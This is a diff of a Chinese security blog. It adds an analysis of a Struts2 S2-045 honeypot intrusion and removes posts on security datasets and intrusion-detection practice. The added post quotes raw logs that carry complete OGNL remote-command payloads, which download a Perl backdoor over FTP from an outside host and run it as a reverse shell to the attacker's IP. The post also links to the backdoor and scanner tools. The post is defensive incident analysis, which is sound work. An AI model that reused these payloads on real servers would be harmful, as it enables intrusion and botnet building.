252</span></div><div class="line">201.79.64.0 - - [02/Sep/2017:02:20:40 +0000] <span class="string">"POST / HTTP/1.0"</span> [] 200 - [Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; MAXTHON 2.0)] [%&#123;(<span class="comment">#fuck='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='wget ftp://88.105.16.7/Public/bc.pl').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?&#123;'cmd.exe','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;] 2.506 700</span></div><div class="line">201.79.64.0 - - [02/Sep/2017:02:20:53 +0000] <span class="string">"POST / HTTP/1.0"</span> [] 200 - [Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; MAXTHON 2.0)] [%&#123;(<span class="comment">#fuck='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='perl bc.pl 201.33.21.109 333').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?&#123;'cmd.exe','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;] 0.307 370</span></div></pre></td></tr></table></figure></p>
+<p>从日志中提取一下攻击者的操作：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">201.33.21.109 - - [02/Sep/2017:01:35:05 +0000] (<span class="comment">#cmd='nMaskCustomMuttMoloz')</span></div><div class="line">201.33.21.109 - - [02/Sep/2017:01:35:05 +0000] (<span class="comment">#cmd='ver &amp; uname')</span></div><div class="line">201.79.64.0 - - [02/Sep/2017:01:38:01 +0000] (<span class="comment">#cmd='whoami')</span></div><div class="line">201.79.64.0 - - [02/Sep/2017:01:42:45 +0000] (<span class="comment">#cmd='wget ftp://88.105.16.7/Public/bc.pl')</span></div><div class="line">201.79.64.0 - - [02/Sep/2017:01:42:54 +0000] (<span class="comment">#cmd='perl bc.pl 201.33.21.109 333')</span></div><div class="line">201.79.64.0 - - [02/Sep/2017:01:43:20 +0000] (<span class="comment">#cmd='wget ftp://88.105.16.7/Public/bc.pl')</span></div><div class="line">201.79.64.0 - - [02/Sep/2017:02:20:53 +0000] (<span class="comment">#cmd='perl bc.pl 201.33.21.109 333')</span></div></pre></td></tr></table></figure></p>
+<p>首先，攻击者使用 ip 201.33.21.109 探测了漏洞是否存在，然后使用 ip 201.79.64.0执行了攻击指令，从 ftp 服务器88.105.16.7上下载了 bc.pl 脚本，接着就执行了该脚本</p>
+<p>bc.pl 是使用 perl 语言编写的一个后门脚本，github上有这个脚本，地址<a href="https://github.com/nikicat/web-malware-collection/blob/master/Backdoors/PL/dc.pl(https://github.com/nikicat/web-malware-collection/blob/master/Backdoors/PL/dc.pl" target="_blank" rel="external">https://github.com/nikicat/web-malware-collection/blob/master/Backdoors/PL/dc.pl(https://github.com/nikicat/web-malware-collection/blob/master/Backdoors/PL/dc.pl</a>)<br>通过这个脚本连接了控制端201.33.21.109，这个 ip 正是此前探测的 ip,在攻击者连接上蜜罐后进行的一些操作没有捕捉到，但是在 /tmp 目录下留下了一些文件，大致分析一下,攻击者下载了两个压缩包，分别是 s4.zip 和 xad.zip<br>其中 s4.zip 内容如下</p>
+<p><img src="H:\gitBlog\themes\landscape\source\upload_image\image2017-9-12_16-39-53.png" alt="image2017-9-12_16-39-53"></p>
+<p>h是一个ELF文件，ports配置了8080端口，paths放了很多路径：</p>
+<p><img src="H:\gitBlog\themes\landscape\source\upload_image\image2017-9-12_16-40-47.png" alt="image2017-9-12_16-40-47"></p>
+<p>s是一个shell脚本，用来从ftp服务器上下载ip列表，这个服务器上存放了大量的ip:</p>
+<p><img src="H:\gitBlog\themes\landscape\source\upload_image\image2017-9-12_16-46-11.png" alt="image2017-9-12_16-46-11"></p>
+<p>此外攻击者还下载了名为 <strong>scan.py </strong>的脚本，这个脚本是 LiJieJie 写的一个 Struts2-045 漏洞批量扫描工具，地址 <a href="https://github.com/lijiejie/struts2_045_scan(" target="_blank" rel="external">https://github.com/lijiejie/struts2_045_scan(</a> <a href="https://github.com/lijiejie/struts2_045_scan" target="_blank" rel="external">https://github.com/lijiejie/struts2_045_scan</a>)</p>
+<p>最终攻击者在服务器上留下了这样几个文件</p>
+<p><img src="H:\gitBlog\themes\landscape\source\upload_image\image2017-9-12_17-5-32.png" alt="image2017-9-12_17-5-32"></p>
+<p>ips 是待扫描的ip，多达 1300 多万个</p>
+<p><img src="H:\gitBlog\themes\landscape\source\upload_image\image2017-9-12_17-6-47.png" alt="image2017-9-12_17-6-47"></p>
+<p>还留了一个 output.good，存放了存在漏洞的主机，测试了几个确实存在漏洞</p>
+<p>攻击过程：<strong>通过045漏洞获得服务器权限</strong>-&gt;<strong>从ftp服务器下载ip列表</strong>-&gt;<strong>使用脚本批量扫描</strong>-&gt;<strong>对存在漏洞的ip进行攻击</strong></p>
+<p>涉及的几个ip分别来自巴西和波兰，近期网上也有人提到不少来自巴西的ip的恶意行为，查了下威胁情报后大致推测这是一个攻击流程的一部分，后期还可能利用漏洞服务器进行一些扫描、挖矿等恶意行为。</p>
+<p><img src="H:\gitBlog\themes\landscape\source\upload_image\204.png" alt="204"></p>
+<p>以上是s4.zip的恶意行为分析，下面对xad.zip内容进行分析：</p>
+<p><img src="H:\gitBlog\themes\landscape\source\upload_image\image2017-9-12_17-13-20.png" alt="image2017-9-12_17-13-20"></p>
+<p>install.txt 和 modulos.sh 内容是一样的，下载了一些环境</p>
+<p><img src="H:\gitBlog\themes\landscape\source\upload_image\15-33.png" alt="15-33"></p>
+<p>cgi 存放了要扫描的路径 /phpMyAdmin/scripts/setup.php 这利用的应该是一个 PHP 代码注入的漏洞，<a href="https://nvd.nist.gov/vuln/detail/CVE-2009-1151" target="_blank" rel="external">CVE-2009-1151</a></p>
+<p>zmeu 是针对 phpmyadmin 的一个蠕虫</p>
+<p>ss 应该就是主要的攻击程序</p>
+<p>beta.sh 内容：</p>
+<p><img src="H:\gitBlog\themes\landscape\source\upload_image\26-48.png" alt="26-48"></p>
+<p>bios.txt 还是待扫描的ip，有99万个，经过扫描产生了大约200个存在漏洞的主机，存放在 vulns.txt</p>
+<p>攻击流程：</p>
+<p><strong>获取服务器权限</strong>-&gt;<strong>下载ip列表</strong>-&gt;<strong>安装需要的环境</strong>-&gt;<strong>批量扫描phpMyAdmin漏洞</strong></p>
+<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>很经典的一个用s2漏洞批量抓鸡进行利用的黑产链，在入侵成功后攻击者继续利用两个高危漏洞批量扫描，进一步扩大战果，目的应该是为了获取尽可能多的主机权限，进而组成一个 bot 网络，后期可能进行 DDos 攻击或者挖矿行为或者其它黑产活动等，这已经形成了一条完整的产业链。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://wsygoogol.github.io/2018/01/09/s2-045入侵事件分析/" data-id="cjca1zrwo000m881bzxd2va1m" class="article-share-link">Share</a>
       
       
     </footer>
@@ -169,574 +392,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://wsygoogol.github.io/2018/01/05/几种常见检测思路的特点/" data-id="cjc7iqrrt000l5s1bc0hejf6p" class="article-share-link">Partager</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-机器学习之安全数据集" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2018/01/02/机器学习之安全数据集/" class="article-date">
-  <time datetime="2018-01-02T09:05:48.000Z" itemprop="datePublished">2018-01-02</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/01/02/机器学习之安全数据集/">机器学习之安全数据集</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p><a href="https://xianzhi.aliyun.com/forum/topic/1879/" target="_blank" rel="external">转自先知</a>,感谢分享</p>
-<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>本文主要收录安全相关的数据集，适合初创，中小型企业用于训练和验证自己的机器学习的模型，提高准确率和准确度。<br>由于数据集可能比较多，一开始也不能全部列举出来，所以后续会慢慢补充，慢慢增加。</p>
-<h2 id="数据集"><a href="#数据集" class="headerlink" title="数据集"></a>数据集</h2><p>每个数据集都会有简单的介绍，内容类型，是否特征化<br>以及适用范围</p>
-<ul>
-<li>网络流量</li>
-<li>主机行为</li>
-<li>文件样本</li>
-</ul>
-<h3 id="KDD-99"><a href="#KDD-99" class="headerlink" title="KDD 99"></a>KDD 99</h3><ul>
-<li><strong>KDD CUP 99 dataset</strong> 就是KDD竞赛在1999年举行时采用的数据集。1998年美国国防部高级规划署（DARPA）在MIT林肯实验室进行了一项入侵检测评估项目收集而来的数据。</li>
-<li>内容类型: 网络流量，主机行为</li>
-<li>是否特征化: 是</li>
-<li>适用范围: 主机入侵检测，异常流量监控</li>
-<li><a href="http://kdd.ics.uci.edu/databases/kddcup99/kddcup99.html" target="_blank" rel="external">下载地址</a></li>
-</ul>
-<h3 id="HTTP-DATASET-CSIC-2010"><a href="#HTTP-DATASET-CSIC-2010" class="headerlink" title="HTTP DATASET CSIC 2010"></a>HTTP DATASET CSIC 2010</h3><ul>
-<li><strong>HTTP DATASET CSIC 2010 </strong>包含已经标注过的针对web服务的请求。数据量约5w条。下载地址已经为我们分类好了训练用的正常数据，测试用的正常数据，测试用的异常数据。</li>
-<li>内容类型: 网络流量</li>
-<li>是否特征化：否</li>
-<li>使用范围: WAF类产品，异常流量监控</li>
-<li><a href="http://www.isi.csic.es/dataset/" target="_blank" rel="external">下载地址</a></li>
-</ul>
-<h3 id="honeypot-json"><a href="#honeypot-json" class="headerlink" title="honeypot.json"></a>honeypot.json</h3><ul>
-<li><strong>honeypot</strong> 是由多种类型的蜜罐采集回来的数据。主要是WEB请求。约99万条数据。由于没有分类和规整，需要自己数据清洗，也可以用作校验模型的数据。</li>
-<li>内容类型: 网络流量</li>
-<li>是否特征化：否</li>
-<li>使用范围: WAF类产品，异常流量监控<br><a href="http://www.secrepo.com/honeypot/honeypot.json.zip" target="_blank" rel="external">下载地址</a></li>
-</ul>
-<h3 id="Masquerading-User-Data"><a href="#Masquerading-User-Data" class="headerlink" title="Masquerading User Data"></a>Masquerading User Data</h3><ul>
-<li><strong>Masquerading User Data</strong> 是Matthias Schonlau 教授通过正常数据构造出来用于训练和检测 Masquerading User攻击的数据集。<br>(内部攻击者分为两种，一种是内鬼[Traitor]，一种是窃取了身份凭证的正常用户的伪装者[Masquerading User]）<br>由于是构造出来的数据，缺乏实际攻击的真实性，在一定程度上，训练出来的模型会存在一定的过拟。</li>
-<li>内容类型: 主机行为</li>
-<li>是否特征化：否</li>
-<li>使用范围: 入侵检测类 用户异常行为识别</li>
-<li><a href="http://www.schonlau.net/intrusion.html" target="_blank" rel="external">下载地址</a></li>
-</ul>
-<h2 id="ADFA-IDS-Datasets"><a href="#ADFA-IDS-Datasets" class="headerlink" title="ADFA IDS Datasets"></a>ADFA IDS Datasets</h2><ul>
-<li><strong>ADFA IDS Datasets</strong> 是澳大利亚国防大学发布的一套关于HIDS的数据集。分为linux（ADFA-LD）和window（ADFA-WD）。</li>
-<li>内容类型: 主机行为</li>
-<li>是否特征化：是</li>
-<li>使用范围: 入侵检测</li>
-<li><a href="https://www.unsw.adfa.edu.au/australian-centre-for-cyber-security/cybersecurity/ADFA-IDS-Datasets/" target="_blank" rel="external">下载地址</a></li>
-</ul>
-<h3 id="域名相关"><a href="#域名相关" class="headerlink" title="域名相关"></a>域名相关</h3><ul>
-<li>正常域名和可疑域名检测。 主要用于DGA的检测。这里直接用Alexa Top 100W 作为正常域名。用其他的开放的DGA数据作为黑样本。</li>
-<li>内容类型: 文本样本</li>
-<li>是否特征化：否</li>
-<li>使用范围: 入侵检测 异常流量 WAF</li>
-<li><a href="http://s3.amazonaws.com/alexa-static/top-1m.csv.zip" target="_blank" rel="external">Alexa Top 100W</a></li>
-<li><a href="http://data.netlab.360.com/dga/" target="_blank" rel="external">360DGA</a></li>
-<li><a href="http://www.secrepo.com/misc/zeus_dga_domains.txt.zip" target="_blank" rel="external">zeusDGA</a></li>
-</ul>
-<h3 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h3><ul>
-<li>这里github有一个比较多样本的收集。涵盖了很多的语言。</li>
-<li>内容类型: 文本样本</li>
-<li>是否特征化：否</li>
-<li>使用范围: 入侵检测 异常流量 WAF</li>
-<li><a href="https://github.com/tennc/webshell" target="_blank" rel="external">下载地址</a></li>
-</ul>
-<h3 id="登录日志"><a href="#登录日志" class="headerlink" title="登录日志"></a>登录日志</h3><ul>
-<li><strong>auth.log</strong> 主要是都是登录失败的日志 适合用作判断是爆破登录还是正常的输错密码</li>
-<li>内容类型: 主机行为</li>
-<li>是否特征化：否</li>
-<li>使用范围: 入侵检测 异常流量 WAF</li>
-<li><a href="http://www.secrepo.com/auth.log/auth.log.gz" target="_blank" rel="external">下载地址</a></li>
-</ul>
-<h3 id="恶意URL"><a href="#恶意URL" class="headerlink" title="恶意URL"></a>恶意URL</h3><ul>
-<li><strong>malicious-URLs</strong> 在Github上面一个 使用机器学习去检测恶意URL的项目 ，里面有一个训练集，有做标记是正常的URL还是恶意的URL</li>
-<li>内容类型: 文本样本</li>
-<li>是否特征化：否</li>
-<li>使用范围: 入侵检测 异常流量 WAF</li>
-<li><a href="https://github.com/faizann24/Using-machine-learning-to-detect-malicious-URLs" target="_blank" rel="external">下载地址</a></li>
-</ul>
-<h3 id="综合数据"><a href="#综合数据" class="headerlink" title="综合数据"></a>综合数据</h3><ul>
-<li>在github上有一个叫 Security-Data-Analysis 的项目，里面有4个实验室 每个实验室的数据都不一样，包含http，连接记录，域名，host等等。</li>
-<li>内容类型: 网络流量</li>
-<li>是否特征化：否</li>
-<li>使用范围: 异常流量</li>
-<li><a href="https://github.com/sooshie/Security-Data-Analysis" target="_blank" rel="external">下载地址</a></li>
-</ul>
-<h3 id="The-Malware-Capture-Facility-Project"><a href="#The-Malware-Capture-Facility-Project" class="headerlink" title="The Malware Capture Facility Project"></a>The Malware Capture Facility Project</h3><ul>
-<li><strong>MCFP</strong> 是捷克理工大学 (CTU 好像也叫捷克技工大学..不是很懂翻译)用于捕抓恶意软件的而抓去的网络流量。里面的数据非常多，有他们自己分析出来的恶意流量，也有所有的流量，包括网络文件，日志，DNS请求等</li>
-<li>内容类型: 网络流量</li>
-<li>是否特征化：否</li>
-<li>使用范围: 异常流量 WAF</li>
-<li><a href="https://mcfp.weebly.com/mcfp-dataset.html" target="_blank" rel="external">下载地址</a></li>
-</ul>
-<h3 id="恶意软件数据库"><a href="#恶意软件数据库" class="headerlink" title="恶意软件数据库"></a>恶意软件数据库</h3><ul>
-<li><strong>MalwareDB</strong> 包含了恶意软件列表 hash,检测结果，所属域名等数据</li>
-<li>内容类型: 文本样本</li>
-<li>使用范围: 特征库 入侵检测</li>
-<li><a href="http://malwaredb.malekal.com/" target="_blank" rel="external">下载地址</a></li>
-</ul>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
-<li><a href="http://www.secrepo.com/" target="_blank" rel="external">secrepo</a></li>
-<li>Web安全机器学习入门</li>
-</ul>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://wsygoogol.github.io/2018/01/02/机器学习之安全数据集/" data-id="cjc7iqrru000o5s1bntzvb0zm" class="article-share-link">Partager</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="w-大型互联网企业入侵检测实战总结" class="article article-type-w" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2017/12/27/大型互联网企业入侵检测实战总结/" class="article-date">
-  <time datetime="2017-12-27T03:12:00.000Z" itemprop="datePublished">2017-12-27</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2017/12/27/大型互联网企业入侵检测实战总结/">大型互联网企业入侵检测实战总结</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p><a href="https://blkstone.github.io/2017/11/21/intrusion-detection-in-big-company/" target="_blank" rel="external">转自</a></p>
-<h1 id="关键词"><a href="#关键词" class="headerlink" title="关键词"></a>关键词</h1><p>UEBA (User and Entity Behavior Analytics)<br>RASP (Runtime Application Self-Protection)<br>HIDS (Host-based Intrusion Detection System) 有一种Agent的感觉<br>NIDS (Network Intrusion Detection System)<br>Sandbox<br>SIEM/SOC (Security Information and Event Management, 安全信息和事件管理, Security Operation Center, 安全运营中心)<br>Splunk<br>Kibana</p>
-<h1 id="博主点评"><a href="#博主点评" class="headerlink" title="博主点评"></a>博主点评</h1><p>把入侵检测聚焦于攻击者<code>GetShell</code>以及<code>GetShell之后</code>的操作，明确目标(不在乎你利用什么漏洞，我们只关注你所使用的shellcode和之后的行为，目标是发现获取shell之后的利用行为)<br>不再在无效攻击告警(尝试攻击成功但未getshell，根据场景举例可能是受限用户的SQL注入)空耗人力。<br>博主曾经做过一阵子 SIEM/SOC 运营，深刻感受到 <strong>告警爆炸</strong> 所产生的问题，对于 SIEM/SOC 系统，强而有效的 <strong>告警去重</strong> 机制是非常必要的。</p>
-<p>对行为监控 (行为主要指针对主机/shell的操作)<br>依赖于行为基线的UEBA，行为基线的设立可以应用机器学习(聚类)。</p>
-<p>另外此文对APT的常见 <strong>攻击路径</strong> 总结得不错，防御的要点也是让攻击者的攻击路径尽可能收敛，从而在几条关键路径上尽可能设防。</p>
-<h1 id="备份信息"><a href="#备份信息" class="headerlink" title="备份信息"></a>备份信息</h1><p>大型互联网企业入侵检测实战总结<br>原文刊载于知乎专栏，作者为 “职业欠钱”。</p>
-<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>入侵检测是每一个大型互联网企业都要面对的一个难题。</p>
-<p>比如，你怎么知道，当前自己公司是不是已经被黑了？是真的没人来黑，还是别人黑了自己没有能力感知到？</p>
-<p>价值越大的公司，面临入侵的威胁越大，像Yahoo！这样的互联网鼻祖，在落幕时仍遭遇全量数据失窃的事情，一旦发生在轻资产的数据化公司身上，后果不堪想象。</p>
-<p>基于保密的考虑，本文不会提及任何具体的策略。希望直接照搬入侵策略的同学可能会失望，但一些思路分享出来，希望得到大家的指点，如能对大家产生些许帮助，也是一个非常令人开心的事。</p>
-<p>限于个人认知，如有谬误，欢迎同行指点。</p>
-<h1 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h1><ul>
-<li>入侵的定义：恶意攻击者不经授权控制我方资源</li>
-<li>我们要发现什么样的入侵： GetShell以及GetShell之后的行为上</li>
-<li>入侵和内鬼：内鬼不在入侵检测讨论范围，移步内部风险控制和审计</li>
-<li>入侵检测的本质：区分未授权的动作，可以模式匹配、异常检测，通过加固让合法行为带标签可简化检测模型</li>
-<li>入侵检测与攻击向量：不存在“通用入侵检测模型”，必须结合“攻击向量”具体分析</li>
-<li>常见入侵手法与应对：杜绝高危端口，优先聚焦Web GetShell</li>
-<li>入侵检测基本原则：减少“误报”是关键</li>
-<li>主流的入侵检测产品形态：HIDS（服务器和终端类似）、NIDS、沙箱、RASP、SIEM/SOC</li>
-<li>入侵检测效果评价指标：主动检出率、可运营的场景覆盖率</li>
-<li>影响入侵检测的关键要素：系统健康度（保证每一台主机、每一时刻、每一个策略都健康运行）</li>
-<li>如何发现APT：等待实施APT的人犯错，高级的0day、木马并不是APT的代言词</li>
-<li>AI在入侵检测领域的正确姿势：别让AI专家领衔，让业务专家提需求，把AI当工具而不是解决方案</li>
-</ul>
-<h1 id="什么是入侵"><a href="#什么是入侵" class="headerlink" title="什么是入侵"></a>什么是入侵</h1><p>电影里典型的入侵场景：</p>
-<p>坏人在很远的地方，通过网络控制你的笔记本、手机、机房的服务器、网络设备，进而随意的读你（笔记本、手机、服务器、网络设备里）的隐私数据（窃取数据）、用你的设备上的功能，实现坏人的意图，比如使用手机的麦克风窃听你在说什么，使用笔记本的摄像头偷窥你在看什么，使用服务器的计算能力挖矿，使用网络能力发动DDOS攻击等等……</p>
-<p>所以，入侵，就是恶意攻击者（俗称黑客），不经授权的控制、使用我方资源（读写文件、执行命令、控制网络资源等）。广义上，黑客使用SQL注入窃取数据，或者拿到了你在域名ISP里的帐号，可以篡改DNS指向一个黑页，又或者找到了你的社交帐号，在微博/QQ/邮箱上，对虚拟资产进行控制，都叫入侵。</p>
-<h1 id="我们要发现什么样的入侵"><a href="#我们要发现什么样的入侵" class="headerlink" title="我们要发现什么样的入侵"></a>我们要发现什么样的入侵</h1><p>企业里的入侵检测，多数时候，需要发现的是狭义上的入侵 —— 一般指黑客对PC、服务器、工作网络（包括办公网、生产网）的控制行为。</p>
-<p>而对PC、服务器等资产的控制，最主流的方法是通过SHELL去下发指令，获得SHELL的这个动作叫做GetShell。常见的方式有通过Web服务的上传漏洞，拿到WebShell，或者利用RCE漏洞直接执行命令（存在漏洞的页面，变相的提供了一个SHELL环境）。另外，也有通过某种方式先植入木马后门，后续直接利用木马集成的SHELL功能对目标进行控制。</p>
-<p>因此，入侵检测重点关注的，是GetShell这个动作，以及GetShell成功之后的恶意行为（为了扩大战果，黑客多半会利用Shell进行探测、翻找窃取、横向移动攻击其它内部目标）。至于有一些同行（包括业界产品），喜欢关注GetShell之前的一些“外部扫描、攻击尝试”行为，在笔者看来基本上是没有意义的。因为一个成功的产品、优秀的公司，外部的扫描和尝试攻击无时无刻不在持续发生的，我们得习惯这是常态，并在这样的常态下去对抗，有什么加固的策略，可以一开始就做，持续的运营，如果有什么策略是无法持续运营的，多半也就不是一个有效的策略了。</p>
-<p>而类似于SQL注入、XSS等一些不直接GetSHell的Web攻击，暂时不在狭义的“入侵检测”考虑范围，而是可以划入“漏洞”、“威胁感知”等领域，另行探讨。当然，利用SQL注入、XSS等入口，进行了GetShell操作的，我们仍抓GetShell这个关键点，而不讨论漏洞入口本身。</p>
-<h1 id="“入侵”和“内鬼”"><a href="#“入侵”和“内鬼”" class="headerlink" title="“入侵”和“内鬼”"></a>“入侵”和“内鬼”</h1><p>与入侵接近的一种场景是内鬼。入侵本身是手段，GetShell只是开始，目的是为了之后对资源的控制和数据的窃取。而内鬼本身拥有合法的权限，可以合法接触敏感资产，但是基于工作以外的目的对这些资源进行非法处置，包括拷贝副本、转移外泄、篡改数据牟利等。</p>
-<p>内鬼的行为不在“入侵检测”的范畴，一般从内部风险控制的视角进行管理和审计，比如职责分离、双人审计等。也有数据防泄密产品，DLP对其进行防御，这里不展开。</p>
-<p>有时候，黑客知道员工A有权限接触目标资产，于是定向攻击员工A，利用员工A的权限把数据窃取走，也定性为“入侵”。毕竟A不是主观恶意的内鬼。如果不能在黑客攻击A的那一刻捕获（军方级对手可能会拥有0day无法防御，免杀木马无法检测），或者无法区分黑客控制的A窃取数据，和正常员工A的访问数据，那这个入侵检测就是失败的。</p>
-<h1 id="入侵检测的本质"><a href="#入侵检测的本质" class="headerlink" title="入侵检测的本质"></a>入侵检测的本质</h1><p>前面已经说过入侵就是坏人可以不经过你的同意，操作你的资产，手段并没有任何限制。那么如何找出入侵行为和合法正常行为的区别，将其跟合法行为分类开，就是“入侵发现”。在模型上，它其本质是一个标记问题（入侵、非入侵）。</p>
-<p>可惜的是，入侵这种动作的“黑”样本特别稀少，想通过大量的数据去训练入侵检测模型，找出入侵的规律，比较难。因此，入侵检测策略人员，往往需要投入大量的时间，去提炼更精准的表达模型，或者花更多的精力去构造“类似入侵”的模拟数据。一个经典的例子是，为了对抗webshell，行业人员往往去GitHub上搜索一些公开的webshell样本，数量大约是不到1000个。而对于机器学习动辄百万级的训练需求，这是远远不够的。</p>
-<p>此时，针对已知样本做技术分类，提炼更精准的模型，被称为传统的特征工程，被视为效率低下的重复劳动，但效果往往比较可以预期。而构造大量的恶意样本，虽然有机器学习、AI等光环加持，但在实际环境中往往难以获得成功 —— 自动生成的样本很难描述webshell本来的含义，多半描述的是自动生成的算法特征。</p>
-<p>另一个方面，入侵的区别是看行为本身是否“授权”，而授权与否本身是没有任何显著的区分特征的。因此，做入侵对抗的时候，如果能够通过某种加固，将合法的访问收敛到有限的通道，并且给该通道做出强有力的区分，也就能大大的降低入侵检测的成本 —— 例如，对访问来源进行严格的认证，无论是自然人，还是程序API，都要求持有合法票据，而派发票据时，针对不同情况做多纬度的认证，再用权限控制台针对这些票据记录和监控它们可以访问的范围。</p>
-<p>这也是Google的BeyondCorp无边界网络得以实施的前提和基础。</p>
-<p>因此，入侵检测的主要思路也就有2种：</p>
-<ol>
-<li>根据特征进行模式匹配；（黑特征法，例如WebShell关键字匹配）</li>
-<li>根据业务历史行为（生成基线模型），对入侵行为做异常对比；（非白既黑），如果业务的历史行为不够收敛，就用加固的手段对其进行收敛，再挑出不合规的小众异常行为。</li>
-</ol>
-<p>入侵检测与攻击向量</p>
-<p>根据目标不同，可能暴露给黑客的攻击面，和黑客可以采用的入侵手法，也完全不同。比如，入侵你手头的PC/笔记本，和入侵部署在机房/云上的服务器，攻击和防御的方法完全不同。</p>
-<p>针对一个明确的“目标”，它被访问的渠道可能是有限集，被攻击的必经路径也有限。一个可以成功入侵的 攻击方法 + 目标 合并起来，就称为一个“攻击向量”。</p>
-<p>因此，谈入侵检测模型效果时，需要先明确攻击向量，针对不同的攻击路径，采集对应的数据，才可能做对应的检测模型。比如，基于SSH登录后的SHELL命令采集，是不会让你发现Webshell的攻击的。而基于网络流量的采集数据，也不会让你获悉黑客是否在SSH后的SHELL环境里执行了什么文件切割打包的动作。</p>
-<p>基于此，如果有人说自己的模型可以无视场景发现APT，那就是在扯犊子。首先你得先把APT对应的攻击向量罗列出来，每一个细分场景是否拥有数据，是否具备发现能力，都要单独去建设的。</p>
-<h1 id="常见的入侵手法与应对"><a href="#常见的入侵手法与应对" class="headerlink" title="常见的入侵手法与应对"></a>常见的入侵手法与应对</h1><p>做入侵检测的，如果对黑客入侵的常见手法、流程理解不足，就容易抓不住重点，有时候会陷入“政治正确”的陷阱里 —— 比如渗透测试团队说，我做了A动作，你无法发现，请你解决。而该场景是否真的危险，在全局的范围内如何排序，解决它耗费的成本和带来的收益如何，都需要有专业经验做支撑来决策。</p>
-<p>下面说说经典教程里，黑客的入侵流程（完整过程可以参考杀伤链模型）：</p>
-<p>黑客要入侵一个目标之前，对该目标是一无所知的，所以第一件事，是“踩点” ——也就是搜集信息。比如，我要黑的目标，有哪些资产（域名、IP、网站服务），它们各自的状态如何，是否存在已知的漏洞（工具），管理他们的人有谁，存在哪些已知的泄漏信息（比如社工库里的密码等）……</p>
-<p>一旦踩点完成，核心的思路就是根据目标找出对应的漏洞、攻击策略进行渗透，比如：</p>
-<h2 id="1-高危服务入侵"><a href="#1-高危服务入侵" class="headerlink" title="1. 高危服务入侵"></a>1. 高危服务入侵</h2><p>所有的公共服务都叫做高危端口，因为该协议、实现该协议的开源组件，可能存在已知的攻击路径（甚至未知的0day），只要你的价值足够高，黑客有足够的资源去挖掘攻击手法，那么当你把高危端口开启的那一刻，就相当于为黑客打开了大门。</p>
-<p>比如SSH、RDP端口开放，这些端口是给管理员维护系统用的，只要知道密码，黑客就能通过该端口获得服务器的权限，完成入侵。黑客可能通过暴力猜解密码，获得凭据，也可能通过其它方式拿到登录凭据。</p>
-<p>或许，你的密码设置得非常强壮，但是这并不是你可以把该端口继续暴露在互联网的理由，我们应该把这些端口限制好，只允许自己的IP（或者内部的堡垒主机）访问，彻底断掉黑客通过它入侵我们的可能。</p>
-<p>与此类似的，MySQL、Redis、FTP、SMTP、MSSQL、Rsync等等，凡是自己用来管理服务器或者数据库、文件的服务，都不应该给互联网打开。否则，蠕虫化的攻击工具会在短短几分钟内攻破你的服务，甚至直接加密你的数据，要求你支付比特币进行勒索。</p>
-<p>还有一些高危服务存在RCE漏洞（远程命令执行），只要端口开放，黑客就能利用现成的exploit，直接GetShell。</p>
-<p>防御建议： 在这里做入侵检测的必要性不高，因为高危服务的具体所指非常的多，不一定存在通用的特征，所以，通过加固方式，收敛攻击入口才是更有效的策略。禁止所有高危端口对互联网开放即可。</p>
